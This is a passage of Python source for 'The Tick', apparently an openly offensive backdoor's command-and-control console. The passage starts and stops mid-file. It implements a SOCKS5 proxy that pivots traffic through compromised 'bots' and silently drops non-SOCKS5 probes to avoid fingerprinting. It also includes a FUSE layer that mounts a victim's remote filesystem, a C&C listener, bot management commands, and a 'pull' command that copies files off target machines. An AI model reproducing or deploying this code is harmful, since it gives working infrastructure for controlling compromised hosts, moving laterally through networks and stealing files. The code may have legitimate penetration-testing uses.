        # The port to listen to for incoming SOCKS proxy requests.
        self.port = port

        # Optional username and password for the SOCKS proxy.
        self.username = username
        self.password = password
        if (username or password) and not (username and password):
            raise ValueError("Must specify both username and password or neither")

        # Flag we'll use to tell the background thread to stop.
        self.alive = False

        # Listening socket for incoming SOCKS proxy requests.
        # Will be created and destroyed inside the run() method.
        self.listen_sock = None

        # This is where we'll keep all the TCP forwarders.
        self.bouncers = []

        # Call the parent class constructor.
        super(SOCKSProxy, self).__init__()

        # Set the thread as a daemon so way when the
        # main thread dies, this thread will die too.
        self.daemon = True

    # This method is invoked in a background thread.
    def run(self):

        # It's aliiiiiiive! \o/
        self.alive = True

        try:

            # Listen on the specified port.
            self.listen_sock = socket()
            self.listen_sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
            self.listen_sock.bind((self.bind_addr, self.port))
            self.listen_sock.listen(5)

            # Loop until they ask us to stop.
            while self.alive:

                # Accept incoming connections.
                # TODO add a console notification here?
                accept_sock = self.listen_sock.accept()[0]

                # Serve each request one by one.
                # This is a bit crappy because, in theory, someone could
                # connect a socket here and just wait, blocking the whole
                # thing. But I don't think we should worry about that.
                # Normal requests won't block because we'll spawn a thread
                # for each once the tunnel has been established.
                # On error, destroy the socket.
                try:
                    self.serve_socks_request(accept_sock)
                except:
                    try:
                        accept_sock.shutdown(2)
                    except Exception:
                        pass
                    try:
                        accept_sock.close()
                    except Exception:
                        pass
                    if self.alive:
                        #print_exc() # XXX DEBUG
                        continue
                    raise

        # Kill the proxy on error.
        except Exception:
            #if self.alive:
            #    print_exc()         # XXX DEBUG
            #    try:
            #        self.kill()
            #    except Exception:
            #        print_exc()     # XXX DEBUG
            #else:
                try:
                    self.kill()
                except Exception:
                    pass

        # Make sure to clean up on exit.
        finally:

            # Not alive anymore. :sadface:
            self.alive = False

            # Destroy the listening socket.
            try:
                self.listen_sock.shutdown(2)
            except Exception:
                pass
            try:
                self.listen_sock.close()
            except Exception:
                pass

    # Process each SOCKS proxy request.
    # This method runs in a background thread and may spawn more threads.
    # Caller is assumed to destroy the socket after the call.
    def serve_socks_request(self, sock):

        # This blog post helped me a lot :)
        # https://rushter.com/blog/python-socks-server/

        # First header is the version and acceptable auth methods.
        # We only support SOCKS 5 and will ignore the auth. :P
        request = recvall(sock, 2)
        if len(request) != 2:
            return          # fail silently
        version, num_auth = unpack("!BB", request)
        if version != 5:
            return          # prevents easy fingerprinting
            #sock.sendall(pack("!BB", 5, 0xff))
            #raise RuntimeError("Bad SOCKS client")
        methods = recvall(sock, num_auth)

        # If we have a username and password, ask for them.
        # If we don't then just let them it. :)
        # If the client insists on giving us a password
        # anyway, just accept anything they send us.
        # TODO perhaps notify the console when this happens?
        if (self.username and self.password) or b"\x00" not in methods:
            sock.sendall(pack("!BB", 5, 2))
            request = recvall(sock, 2)
            if not request:
                return          # fail silently
            version, ulen = unpack("!BB", request)
            if version != 1:
                return          # fail silently
            uname = recvall(sock, ulen).decode("utf8")
            plen, = unpack("!B", recvall(sock, 1))
            passwd = recvall(sock, ulen).decode("utf8")
            if self.username and self.password and (self.username != uname or self.password != passwd):
                sock.sendall(pack("!BB", 5, 0xff))
                # TODO perhaps notify the console when this happens?
                #raise RuntimeError("SOCKS authentication failure, user: %r, pass: %r" % (uname, passwd))
                return          # fail silently
            sock.sendall(pack("!BB", 1, 0))
        else:
            sock.sendall(pack("!BB", 5, 0))

        # If all went well we should get a proxy request now.
        # We only support CONNECT requests for IPv4.
        request = recvall(sock, 4)
        if not request:
            return          # fail silently
        version, cmd, _, atyp = unpack("!BBBB", request)
        if version != 5 or cmd != 1 or atyp not in (1, 3):
            sock.sendall(pack("!BBBBIH", 5, 5, 0, atyp, 0, 0))
            return
            #raise RuntimeError("Unsupported SOCKS request")
        if atyp == 1:
            addr = inet_ntoa(recvall(sock, 4))
            port, = unpack("!H", recvall(sock, 2))
        elif atyp == 3:
            name_len, = unpack("!B", recvall(sock, 1))
            name = recvall(sock, name_len).decode("utf8")
            port, = unpack("!H", recvall(sock, 2))
        else:
            raise Exception("internal error")

        # Try to get the bot now.
        # If we can't find it, reject the connection attempt.
        try:
            bot = self.listener.bots[self.uuid]
        except Exception:
            sock.sendall(pack("!BBBBIH", 5, 5, 0, atyp, 0, 0))
            raise

        # Do a DNS resolution remotely if needed.
        if atyp == 3:
            try:
                addr = None
                for x in bot.dns_resolve(name):
                    try:
                        inet_aton(x)
                        addr = x
                        break
                    except error:
                        continue
                if not addr:
                    raise RuntimeError("could not resolve %s to ipv4 address" % name)
            except Exception:
                sock.sendall(pack("!BBBBIH", 5, 5, 0, atyp, 0, 0))
                raise

        # Do a TCP pivot on the bot.
        try:
            bot_sock = bot.tcp_pivot(addr, port)
        except Exception:
            sock.sendall(pack("!BBBBIH", 5, 5, 0, atyp, 0, 0))
            raise

        try:

            # Tell the client the connection was successful.
            sock.sendall(pack("!BBBB", 5, 0, 0, 1) + inet_aton(addr) + pack("!H", port))

            # Launch the TCP forwarders now.
            bouncer_1 = TCPForward(sock, bot_sock)
            bouncer_2 = TCPForward(bot_sock, sock)
            bouncer_1.start()
            bouncer_2.start()
            self.bouncers.append(bouncer_1)
            self.bouncers.append(bouncer_2)

        # Clean up the pivoted connection on exception.
        except Exception:
            try:
                bot_sock.shutdown(2)
            except Exception:
                pass
            try:
                bot_sock.close()
            except Exception:
                pass
            raise

    # Forcefully kill the background thread.
    # The accept() call is a bit particular in Python,
    # we can't just close the socket and call it a day.
    # This resulted in stubborn listener threads who simply
    # refused to die... extreme measures had to be taken. ;)
    def kill(self):

        # Trivial case.
        if not self.alive:
            return

        # Set the flag to false so the thread
        # knows we are asking it to quit.
        self.alive = False

        try:

            # Connect briefly to the listnening port.
            # This will "wake up" the thread stuck
            # in the blocking socket accept() call.
            s = socket()
            try:
                s.connect(("127.0.0.1", self.port))
            finally:
                s.close()

        finally:

            # Kill all the TCP forwarders too.
            while self.bouncers:
                bouncer = self.bouncers.pop()
                try:
                    bouncer.kill()
                except Exception:
                    print_exc()     # XXX DEBUG
                    pass

# FUSE daemon.
# This is split into a background process that implements the actual
# FUSE wrapper, and a background thread that talks to that process
# in order to forward any calls that need to be made to the bots.
# This way we keep the FUSE part neatly separated from our process,
# while at the same time ensuring the main process with the console
# is the one actually communicating with the bots.
if HAVE_FUSE:

    class FUSEThread(Thread):

        def __init__(self, listener, uuid, mountpoint, args):

            # Keep a bot listener instance and the UUID of the bot.
            # This is better than keeping the actual Bot instance,
            # because if the bot dies and reconnects with the same ID
            # we can transparently use the new socket.
            self.listener = listener
            self.uuid = uuid

            try:

                # Create a full duplex pipe to talk to the background process.
                self.pipe, child_pipe = Pipe()

                # Create a background process.
                self.process = FUSEProcess(child_pipe, mountpoint, args)

            except:

                # Clean up on error.
                try:
                    self.pipe.close()
                except:
                    pass
                raise

            # Flag we'll use to tell the background thread to stop.
            self.alive = False

            # Call the parent class constructor.
            super(FUSEThread, self).__init__()

            # Set the thread as a daemon so way when the
            # main thread dies, this thread will die too.
            self.daemon = True

        # This method is invoked in a background thread.
        # It forwards calls to the Bot object.
        def run(self):
            self.alive = True
            try:
                self.process.start()
                while self.alive:
                    try:
                        method, args, kwargs = self.pipe.recv()
                        bot = self.listener.bots[self.uuid]
                        if not bot.alive:
                            raise BotError("disconnected")
                        resp = getattr(bot, method)(*args, **kwargs)
                        self.pipe.send(resp)
                    except Exception as e:
                        self.pipe.send(e)
                    except:
                        self.pipe.send(BotError("disconnected"))
            except:
                pass
            finally:
                self.kill()

        # Forcefully kill the background thread.
        # This in turn kills the background process too.
        def kill(self):
            if not self.alive:
                return
            self.alive = False
            try:
                self.pipe.close()
            except:
                pass
            try:
                self.process.terminate()
            except:
                pass

    class FUSEProcess(Process):

        def __init__(self, pipe, mountpoint, args):

            # We will use this pipe to forward bot calls.
            self.pipe = pipe

            # Mount point.
            self.mountpoint = mountpoint

            # Arguments for FUSE.
            self.args = args

            # Call the parent class constructor.
            super(FUSEProcess, self).__init__()

            # Set the process as a daemon so way when the
            # main process dies, this process will die too.
            self.daemon = True

        # Filesystem service loop.
        # This method is invoked in a background process.
        def run(self):
            try:
                self.handler = FUSEHandler(self, dash_s_do='setsingle')
                self.handler.parser.prog = "mount"
                self.handler.parse([self.mountpoint] + self.args + ["-f", "-s"])
                self.handler.main()
            finally:
                try:
                    self.pipe.close()
                except:
                    pass

        # Make a remote call.
        def rpc(self, method, *args, **kwargs):
            #print("CALLING " + method)
            self.pipe.send( ("file_" + method, args, kwargs) )
            resp = self.pipe.recv()
            if isinstance(resp, Exception):
                raise resp
            return resp

    class FUSEHandler(fuse.Fuse):
        def __init__(self, parent, *args, **kwargs):
            self.__parent = parent
            super(FUSEHandler, self).__init__(*args, **kwargs)

        # The following are various calls FUSE needs.

        # we're faking this one
        def mknod(self, path, mode, dev):
            if dev != 0:
                return -errno.ENOENT
            r = self.open(path, os.O_CREAT)
            if r:
                return r
            self.chmod(path, mode)

        # we're ignoring this ones
        def setattr(self, *args, **kwargs):
            return
        def getxattr(self, *args, **kwargs):
            return
        def setxattr(self, *args, **kwargs):
            return
        def removeattr(self, *args, **kwargs):
            return
        def removexattr(self, *args, **kwargs):
            return
        def lock(self, *args, **kwargs):
            return
        def utimens(self, *args, **kwargs):
            return
        def bmap(self, *args, **kwargs):
            return
        def fsinit(self, *args, **kwargs):
            return
        def fsdestroy(self, *args, **kwargs):
            return
        def flush(self, *args, **kwargs):
            return
        def fgetattr(self, *args, **kwargs):
            return
        def ftruncate(self, *args, **kwargs):
            return
        def releasedir(self, *args, **kwargs):
            return
        def fsyncdir(self, *args, **kwargs):
            return
        def fsync(self, *args, **kwargs):
            return
        def release(self, *args, **kwargs):
            return

        def open(self, path, flags):
            try:
                r = self.__parent.rpc("open", path, flags=flags)
                if r:
                    r = -r
                return r
            except:
                #print_exc()
                return -errno.ENOENT

        def read(self, path, size, offset):
            try:
                return self.__parent.rpc("read", path, size, offset)
            except:
                #print_exc()
                return -errno.ENOENT

        def write(self, path, buf, offset):
            try:
                return self.__parent.rpc("write", path, buf, offset)
            except:
                #print_exc()
                return -errno.ENOENT

        def truncate(self, path, length, fh=None):
            try:
                return self.__parent.rpc("truncate", path, length)
            except:
                #print_exc()
                return -errno.ENOENT

        def getattr(self, path):
            try:
                resp = self.__parent.rpc("stat", path)
            except:
                #print_exc()
                return -errno.ENOENT
            st = fuse.Stat()
            st.st_dev = resp.dev
            st.st_ino = resp.ino
            st.st_mode = resp.mode
            st.st_nlink = resp.nlink
            st.st_uid = resp.uid
            st.st_gid = resp.gid
            st.st_size = resp.size
            st.st_atime = resp.atime
            st.st_mtime = resp.mtime
            st.st_ctime = resp.ctime
            return st

        def readdir(self, path, offset):
            try:
                resp = self.__parent.rpc("readdir", path)
            except:
                #print_exc()
                return []
            return [ fuse.Direntry(x.decode("utf8", "ignore")) for x in resp ]

        def readlink(self, path):
            try:
                return self.__parent.rpc("readlink", path).decode("utf8", "ignore")
            except:
                #print_exc()
                return -errno.ENOENT

        def symlink(self, linkname, target):
            try:
                self.__parent.rpc("symlink", linkname, target)
            except:
                #print_exc()
                return -errno.ENOENT

        def link(self, linkname, target):
            try:
                self.__parent.rpc("link", linkname, target)
            except:
                #print_exc()
                return -errno.ENOENT

        def unlink(self, path):
            try:
                self.__parent.rpc("unlink", path)
            except:
                #print_exc()
                return -errno.ENOENT

        def rmdir(self, path):
            try:
                self.__parent.rpc("rmdir", path)
            except:
                #print_exc()
                return -errno.ENOENT

        def mkdir(self, path):
            try:
                self.__parent.rpc("mkdir", path)
            except:
                #print_exc()
                return -errno.ENOENT

        def chmod(self, path, mode = 0o777):
            try:
                self.__parent.rpc("chmod", path, mode)
            except:
                #print_exc()
                return -errno.ENOENT

        def chown(self, path, user, group):
            try:
                self.__parent.rpc("chown", path, user, group)
            except BotError as e:
                if str(e) != "not implemented":  # silently ignore for Windows
                    return -errno.ENOENT
            except:
                #print_exc()
                return -errno.ENOENT

        def access(self, path, mode):
            try:
                granted = self.__parent.rpc("access", path, mode)
            except:
                #print_exc()
                return -errno.ENOENT
            if not granted:
                return -errno.EACCES

        def statfs(self):
            try:
                resp = self.__parent.rpc("statvfs", "/\0")
            except:
                #print_exc()
                return -errno.ENOENT
            vfs = fuse.StatVFS()
            vfs.f_bsize   = resp.bsize
            vfs.f_frsize  = resp.frsize
            vfs.f_blocks  = resp.blocks
            vfs.f_bfree   = resp.bfree
            vfs.f_bavail  = resp.bavail
            vfs.f_files   = resp.files
            vfs.f_ffree   = resp.ffree
            vfs.f_favail  = resp.favail
            vfs.f_flag    = resp.flag
            vfs.f_namemax = resp.namemax
            return vfs

##############################################################################
# The Tick console. This is the one that launches everything else.

# Based on the standard cmd module, but with various hacks inside.
# And with pretty colors! Colorrrrrrssssssssssssssssssss!
class Console(Cmd):
    "Interactive text console to manage The Tick bots."

    # Header for help page.
    doc_header = 'Available commands (type help * or help <command>)'

    # Undocumented commands. We don't want them showing up on help.
    hidden = ["EOF", "dbg"]

    def __init__(self, args = ()):

        # This member will contain the currently selected bot.
        self.current = None

        # This is a set of previously seen bot UUIDs.
        # We use this to avoid notifying the user for bot reconnections,
        # since we only want to show new bots connecting to the C&C.
        # Reconnections may happen sporadically and just clutter the screen.
        self.known_bots = set()

        # These are the currently running SOCKS proxies.
        # Keys are port numbers, values are SOCKSProxy objects.
        # See the do_proxy() method for more details.
        self.proxies = {}

        # These are the currently running FUSE mount points.
        # Keys are pathnames, values are FUSEThread objects.
        # See the do_mount() method for more details.
        self.filesystems = {}

        # The TCP port listener for bots will be here.
        self.listener = None

        # This is the list of queued notifications.
        # Notifications come from a background thread and when possible
        # they are shown in real time, but when not they are queued here.
        self.notifications = []

        # This flag is related to the notifications.
        # We'll use it to know whether it's safe to print them directly
        # or we should wait until a better time to do it. Specifically,
        # we will only print notifications in real time if the main thread
        # is blocked waiting for user input, and queue them in any other case.
        self.inside_prompt = False

        # File existence validator.
        def validate_filename(parser, name, arg):
            if not os.path.exists(arg):
                parser.error(name + " not found: " + arg)
            return arg

        # All the supported command line switches go here.
        parser = ArgumentParser(formatter_class=ColorHelpFormatter,
                prog=Fore.GREEN+Style.BRIGHT+os.path.basename(sys.argv[0])+Style.RESET_ALL,
                description="A simple backdoor for servers and embedded systems.")
        parser.add_argument("--version", action="version",
                version="The Tick, by Mario Vilas, version "+Fore.YELLOW+TICK_VERSION+Style.RESET_ALL)
        parser.add_argument("-b", "--bind", dest="bind_addr", default="0.0.0.0",
                metavar=Fore.BLUE+Style.BRIGHT+"ADDRESS"+Style.RESET_ALL,
                help="IP address to bind all the listeners to [default: "+Fore.YELLOW+"0.0.0.0"+Style.RESET_ALL+"]")
        parser.add_argument("-p", "--port", type=int, default=5555,
                metavar=Fore.BLUE+Style.BRIGHT+"PORT"+Style.RESET_ALL,
                help="Port to bind the TCP listener to [default: "+Fore.YELLOW+"5555"+Style.RESET_ALL+"]")
        parser.add_argument("-s", "--ssl", type=int, default=6666, dest="ssl_port",
                metavar=Fore.BLUE+Style.BRIGHT+"PORT"+Style.RESET_ALL,
                help="Port to bind the SSL listener to [default: "+Fore.YELLOW+"6666"+Style.RESET_ALL+"]")
        parser.add_argument("-k", "--keyfile", type=lambda x: validate_filename(parser, "keyfile", x), default=None,
                metavar=Fore.BLUE+Style.BRIGHT+"FILE"+Style.RESET_ALL,
                help="SSL keyfile [default: "+Fore.YELLOW+"keyfile.pem"+Style.RESET_ALL+"]")
        parser.add_argument("-c", "--certfile", type=lambda x: validate_filename(parser, "certfile", x), default=None,
                metavar=Fore.BLUE+Style.BRIGHT+"FILE"+Style.RESET_ALL,
                help="SSL certfile [default: "+Fore.YELLOW+"certfile.pem"+Style.RESET_ALL+"]")
        parser.add_argument("--no-color", action="store_true", default=False,
                help=("Disable the use of ANSI escape sequences (i.e. pretty "+
                Fore.RED+"c"+Style.BRIGHT+"o"+Fore.YELLOW+"l"+Fore.GREEN+"o"+Fore.BLUE+"r"+Fore.MAGENTA+"s"+Style.RESET_ALL+
                " and other niceties)"))
        parser.add_argument("--pro", action="store_true", default=False,
                help="Replace the 0ldsch00l bloody banner with a cleaner, more sober banner,"\
                " one more suitable for a pentesting report from an infosec professional"\
                " such as yourself. Yes, this is who you are now. Accept it.")

        # Try to adjust the help text to the console size.
        # On error just ignore it and go with the default.
        try:
            width = int(check_output('stty size 2>/dev/null', shell=True).split(' ')[1])
            if width > 160: width = 140
            elif width < 80: width = 80
            os.environ["COLUMNS"] = str(width)
        except Exception:
            ##raise  # XXX DEBUG
            pass

        # Parse the command line arguments.
        self.args = parser.parse_args(args)

        # If no keyfile and certfile were given, try the defaults.
        # We do this here because otherwise argparse would flag it
        # as an error, and we want to fail gracefully in this case.
        if not self.args.certfile and os.path.exists("certfile.pem"):
            self.args.certfile = "certfile.pem"
        if not self.args.keyfile and os.path.exists("keyfile.pem"):
            self.args.keyfile = "keyfile.pem"

        # Show either the fun or the boring banner.
        self.use_boring_banner = self.args.pro

        # Call the parent class constructor.
        Cmd.__init__(self)

    # Context manager to ensure proper cleanup.
    # Launching the daemons is done here to ensure it's mandatory.
    def __enter__(self):

        # Fire up the TCP C&C listener.
        self.listener = Listener(
            callback = self.notify_new_bot,
            bind_addr = self.args.bind_addr,
            port = self.args.port,
            ssl_port = self.args.ssl_port,
            keyfile = self.args.keyfile,
            certfile = self.args.certfile,
        )
        self.listener.start()

        # Comply with the context managers protocol.
        return self

    # Context manager to ensure proper cleanup.
    # This will kill all the background daemons.
    def __exit__(self, *args):
        try:
            for proxy in self.proxies.values():
                try:
                    proxy.kill()
                except Exception:
                    print_exc()
        except Exception:
            print_exc()
        try:
            for fusethread in self.filesystems.values():
                try:
                    fusethread.kill()
                except Exception:
                    print_exc()
        except Exception:
            print_exc()
        try:
            self.listener.kill()
        except Exception:
            print_exc()

    # This prevents the help from showing the undocumented commands.
    def get_names(self):
        names = Cmd.get_names(self)
        for undoc in self.hidden:
            undoc = "do_" + undoc
            if undoc in names:
                names.remove(undoc)
        return names

    # This method is called by the listener whenever a new bot connects.
    # It will show a message to the user right below the command prompt.
    # Note that this method will be invoked from a background thread.
    def notify_new_bot(self, listener, bot):

        # Notifications for reconnecting bots are skipped because they're
        # not very useful except for debugging.
        if bot.uuid not in self.known_bots:

            # Prepare the notification text.
            index = list(listener.bots.keys()).index(bot.uuid)
            text = "Bot %d [%s] connected from %s" % (index, bot.uuid, bot.from_addr[0])
            text = Fore.BLUE + Style.BRIGHT + text + Style.RESET_ALL

            # If the main thread is blocked waiting at the prompt,
            # do some ANSI escape codes magic to insert the notification text on screen.
            # Note that we cannot use this trick if --no-color was specified.
            # (I mean, we could, but what if the reason the colors were turned off
            # was that the C&C was not being run in a console with a proper tty?)
            if self.inside_prompt and ANSI_ENABLED:
                buf_bkp = readline.get_line_buffer()
                sys.stdout.write("\033[s\033[0G\033[2K" + text + "\n")
                sys.stdout.write(self.prompt.replace("\x01", "").replace("\x02", "") + buf_bkp + "\033[u\033[1B")
                sys.stdout.flush()
                readline.redisplay()

            # If we are not blocked at the prompt, better not write now!
            # We would be messing up the output of some command.
            # We'll queue the notification instead to be shown later.
            else:
                self.notifications.append(text)

            # Remember we've seen this bot so we don't notify again.
            self.known_bots.add(bot.uuid)

    # Hook the precmd event to know when we're out of the command prompt.
    def precmd(self, line):
        try:

            # If the currently selected bot is not alive, deselect it automatically.
            # This may happen for example if the bot dies after executing a command,
            # the connection is dropped unexpectedly, or the command was one of those
            # that reuse the C&C socket to do something else.
            if self.current is not None and (not self.current.alive or self.is_bot_busy()):
                self.current = None

            # Set the flag to indicate we're NOT blocked at the prompt.
            self.inside_prompt = False

        # Catch all exceptions, show the traceback and continue.
        except Exception:
            print_exc()

        # Don't forget to return this or we can't run commands!
        return line

    # Hook the precmd event to know when we're in the command prompt.
    # This is also a good time to issue the queued notifications.
    def postcmd(self, stop, line):
        try:

            # If the currently selected bot is not alive, deselect it automatically.
            # This may happen for example if the bot dies after executing a command,
            # the connection is dropped unexpectedly, or the command was one of those
            # that reuse the C&C socket to do something else.
            if self.current is not None and (not self.current.alive or self.is_bot_busy()):
                self.current = None

            # If we have queued notifications, show them now.
            while self.notifications:
                print(self.notifications.pop(0))

            # Set the flag to indicate we're blocked at the prompt.
            self.inside_prompt = True

        # Catch all exceptions, show the traceback and continue.
        except Exception:
            print_exc()

        # Don't forget to return this or we can't quit!
        return stop

    # Hook the preloop event because otherwise we don't
    # find out when the prompt is shown for the first time.
    def preloop(self):
        try:

            # If the currently selected bot is not alive, deselect it automatically.
            # This may happen for example if the bot dies after executing a command,
            # the connection is dropped unexpectedly, or the command was one of those
            # that reuse the C&C socket to do something else.
            if self.current is not None and (not self.current.alive or self.is_bot_busy()):
                self.current = None

            # Set the flag to indicate we're blocked at the prompt.
            self.inside_prompt = True

        # Catch all exceptions, show the traceback and continue.
        except Exception:
            print_exc()

    # Default behaviour for the base class is to repeat the last command if
    # a blank line is given. This is quite dangerous so we're disabling it.
    def emptyline(self):
        return ""

    # This property generates the banner.
    @property
    def banner(self):

        # Prepare the dynamic part of the banner.
        if self.listener.keyfile and self.listener.certfile:
            listening_on = ("Listening on: %s:%d (plaintext), %s:%d (SSL)" % (self.listener.bind_addr, self.listener.port, self.listener.bind_addr, self.listener.ssl_port))
        else:
            listening_on = ("Listening on: %s:%d (plaintext)" % (self.listener.bind_addr, self.listener.port))

        # Boring banner :(
        if self.use_boring_banner:
            return BORING_BANNER + Fore.GREEN + listening_on + Style.RESET_ALL

        # Fun banner :)
        return FUN_BANNER + Style.BRIGHT + Fore.GREEN + listening_on + Style.RESET_ALL

    # This property generates the command prompt.
    @property
    def prompt(self):

        # If the currently selected bot is not alive, deselect it automatically.
        # This may happen for example if the bot dies after executing a command,
        # the connection is dropped unexpectedly, or the command was one of those
        # that reuse the C&C socket to do something else.
        if self.current is not None and (not self.current.alive or self.is_bot_busy()):
            self.current = None

        # If no bot is selected, show the corresponding prompt.
        if self.current is None:
            return "\x01" + Fore.RED + "\x02" + "[No bot selected] " + "\x01" + Style.RESET_ALL + "\x02"

        # If a bot is selected, show its info in the prompt.
        bot = self.current
        index = list(self.listener.bots.keys()).index(bot.uuid)
        addr = bot.from_addr[0]
        return "\x01" + Fore.GREEN + Style.BRIGHT + "\x02" + ("[Bot %d: %s] " % (index, addr)) + "\x01" + Style.RESET_ALL + "\x02"

    # Helper function to tell if a bot is busy.
    # If no bot is given, the currently selected bot is tested.
    def is_bot_busy(self, bot = None):
        if bot is None:
            bot = self.current
            if bot is None:
                return False
        uuid = bot.uuid
        for x in self.proxies.values():
            if x.uuid == uuid:
                return True
        for x in self.filesystems.values():
            if x.uuid == uuid:
                return True
        return False

    #
    # The implementation for each command follows.
    #

    def do_help(self, line):
        """
    \x1b[32m\x1b[1mhelp\x1b[0m
    \x1b[32m\x1b[1mhelp\x1b[0m \x1b[34m\x1b[1m*\x1b[0m
    \x1b[32m\x1b[1mhelp\x1b[0m <\x1b[34m\x1b[1mcommand\x1b[0m> [\x1b[34m\x1b[1mcommand\x1b[0m...]

    Without arguments, shows the list of available commands.
    With arguments, shows the help for one or more commands.
    Use "\x1b[34m\x1b[1mhelp *\x1b[0m" to show help for all commands at once.
    The question mark "\x1b[34m\x1b[1m?\x1b[0m" can be used as an alias for "\x1b[34m\x1b[1mhelp\x1b[0m".\n"""
        if not line.strip():
            Cmd.do_help(self, line)
        else:
            commands = split(line, comments=True)
            if commands == ["*"]:
                commands = self.get_names()
                commands = [ x[3:] for x in commands if x.startswith("do_") ]
                commands.sort()
            last = len(commands) - 1
            index = 0
            for cmd in commands:
                Cmd.do_help(self, cmd)
                if index < last:
                    print(Fore.RED + Style.BRIGHT + ("-" * 79) + Style.RESET_ALL)
                index += 1

    def do_exit(self, line):
        """
    \x1b[32m\x1b[1mexit\x1b[0m

    Exit the command interpreter.
    This command takes no arguments.\n"""

        # Parse the arguments, on error show help.
        if line.strip():
            self.onecmd("help exit")
            return

        # Quit the command intepreter.
        # The context manager will take care of cleaning up.
        return True

    def do_EOF(self, line):
        print("")
        return self.do_exit(line)

    def do_clear(self, line):
        """
    \x1b[32m\x1b[1mclear\x1b[0m

    Clear the screen.
    This command takes no arguments.\n"""

        # Parse the arguments, on error show help.
        if line.strip():
            self.onecmd("help clear")
            return

        # Clear the screen using the magic of ANSI escape codes.
        # We need to make sure the escape codes are not being filtered out.
        if not ANSI_ENABLED:
            deinit()
            init()
        print("\033[2J\033[1;1f")
        if not ANSI_ENABLED:
            deinit()
            init(wrap = True, strip = True)

    def do_bots(self, line):
        """
    \x1b[32m\x1b[1mbots\x1b[0m

    List all currently connected bots.
    This command takes no arguments.\n"""

        # Parse the arguments, on error show help.
        if line.strip():
            self.onecmd("help bots")
            return

        # If we have no connected bots, just show an error message.
        if not self.listener.bots:
            print(Fore.YELLOW + "No bots have connected yet" + Style.RESET_ALL)
            return

        # We will show the list of bots in an ASCII art table.
        # Because of course we will. ;)
        # Note that we can't use ANSI escapes here because the
        # size calculations for the table go wrong, so we do a
        # dirty trick instead with placeholder characters.
        table = Texttable()
        table.set_deco(Texttable.HEADER)
        table.set_cols_dtype(("i", "t", "t", "t", "t"))
        table.set_cols_align(("l", "c", "c", "c", "c"))
        table.set_cols_valign(("t", "t", "t", "t", "t"))
        table.set_cols_width((len(str(len(self.listener.bots))), 38, 17, 5, 6))
        table.add_rows((("#", "UUID", "IP address", "SSL", "Status"),), header = True)
        i = 0
        for bot in self.listener.bots.values():
            busy = self.is_bot_busy(bot)
            ssl = "\x03yes\x04" if bot.encrypted else "\x01no\x04"
            status = "\x01gone\x04"
            if bot.alive:
                status = "\x03live\x04"
            if busy:
                status = "\x02busy\x04"
            table.add_row((
                i,
                bot.uuid,
                "\x02" + bot.from_addr[0] + "\x04",
                ssl,
                status
            ))
            i += 1
        text = table.draw()
        text = text.replace("\x01", " " + Fore.RED + Style.BRIGHT)
        text = text.replace("\x02", " " + Fore.BLUE + Style.BRIGHT)
        text = text.replace("\x03", " " + Fore.GREEN + Style.BRIGHT)
        text = text.replace("\x04", Style.RESET_ALL + " ")
        print("")
        print(text)
        print("")

    def do_current(self, line):
        """
    \x1b[32m\x1b[1mcurrent\x1b[0m

    Shows the currently selected bot.
    This command takes no arguments.\n"""

        # Parse the arguments, on error show help.
        if line.strip():
            self.onecmd("help current")
            return

        # If no bot is selected, show a simple message.
        if self.current is None:
            print(Fore.YELLOW + "No bot selected" + Style.RESET_ALL)
            return

        # Show the details of the currently selected bot.
        bot = self.current
        addr = bot.from_addr[0]
        uuid = bot.uuid
        index = list(self.listener.bots.keys()).index(uuid)
        print((
            "\n" +
            "Bot number: #%d\n" +
            "IP address: %s\n" +
            "UUID: [" + Fore.BLUE + Style.BRIGHT + "%s" + Style.RESET_ALL + "]\n"
        ) % (index, addr, uuid))

    def do_use(self, line):
        """
    \x1b[32m\x1b[1muse\x1b[0m <\x1b[34m\x1b[1mIP address\x1b[0m>
    \x1b[32m\x1b[1muse\x1b[0m <\x1b[34m\x1b[1mnumber\x1b[0m>
    \x1b[32m\x1b[1muse\x1b[0m <\x1b[34m\x1b[1mUUID\x1b[0m>
    \x1b[32m\x1b[1muse\x1b[0m

    Select a bot to use. Try the "\x1b[32m\x1b[1mbots\x1b[0m" command to list the available bots.
    When invoked with no arguments, the currently selected bot is deselected.\n"""

        # When invoked with no arguments, deselect the current bot.
        line = line.strip()
        if not line:
            self.current = None
        else:

            # Parse the arguments, on error show help.
            try:
                bot_id, = split(line, comments=True)
            except Exception:
                self.onecmd("help use")
                return

            # If a UUID was passed, we can fetch it directly from the dict.
            try:
                bot = self.listener.bots[bot_id]
            except KeyError:

                # If a number was passed, we can get it by index.
                # That's why we used an OrderedDict in the listener.
                try:
                    bot = list(self.listener.bots.values())[ int(bot_id) ]
                except IndexError:
                    print(Fore.YELLOW + ("Error: no bot number %d found" % int(bot_id)) + Style.RESET_ALL)
                    return
                except ValueError:

                    # Last change: was it an IP address?
                    # Fetch the first bot we can find from that IP.
                    # There may be more than one (think a LAN behind a NAT),
                    # but that's the user's problem, not ours...
                    try:
                        inet_aton(bot_id)
                    except OSError:
                        self.onecmd("help use")     # wasn't an IP either :(
                        return
                    found = False
                    index = 0
                    for bot in self.listener.bots.values():
                        if bot.alive and bot_id == bot.from_addr[0]:
                            found = True
                            break
                        index = index + 1
                    if not found:
                        print(Fore.YELLOW + ("Error: no bot connected to IP address %s" % bot_id) + Style.RESET_ALL)
                        return

            # The bot must not be busy.
            if self.is_bot_busy(bot):
                print(Fore.YELLOW + "Bot is busy" + Style.RESET_ALL)
                return

            # The bot must be alive.
            if not bot.alive:
                print(Fore.YELLOW + "Bot is disconnected" + Style.RESET_ALL)
                return

            # Select the bot.
            self.current = bot

    def do_pull(self, line):
        """
    \x1b[32m\x1b[1mpull\x1b[0m <\x1b[34m\x1b[1mremote file\x1b[0m>
    \x1b[32m\x1b[1mpull\x1b[0m <\x1b[34m\x1b[1mremote file\x1b[0m> <\x1b[34m\x1b[1mlocal file\x1b[0m>

    Pull a file from the target machine.\n"""

        # A bot must be selected.
        if self.current is None:
            print(Fore.YELLOW + "Error: no bot selected" + Style.RESET_ALL)
            return

        # The bot must not be busy.
        if self.is_bot_busy():
            print(Fore.YELLOW + "Bot is busy" + Style.RESET_ALL)
            return

        # Parse the arguments, on error show help.
        try:
            args = split(line, comments=True)
            if len(args) == 1:
                remote_file = args[0]
                if ("/") in remote_file and "\\" not in remote_file:
                    local_file = posixpath.basename(remote_file)
                elif ("/") not in remote_file and "\\" in remote_file:
                    local_file = ntpath.basename(remote_file)
                local_file = os.path.basename(remote_file)
            else:
                remote_file, local_file = args
        except Exception:
            self.onecmd("help pull")
            return

        # Perform the operation.
